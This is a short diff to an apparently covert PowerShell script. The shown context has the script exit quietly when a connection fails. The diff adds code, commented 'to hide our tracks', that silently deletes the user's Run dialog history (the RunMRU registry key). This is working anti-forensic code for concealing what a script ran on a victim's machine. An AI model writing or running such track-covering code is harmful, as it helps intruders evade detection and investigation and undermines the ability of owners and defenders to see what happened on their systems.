@@ -40,3 +40,7 @@ try {
     # If connection fails, the script just exits quietly
     exit
 }
+# Remove the Run dialog history to hide our tracks
+$Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+Remove-ItemProperty -Path $Path -Name "*" -ErrorAction SilentlyContinue
+
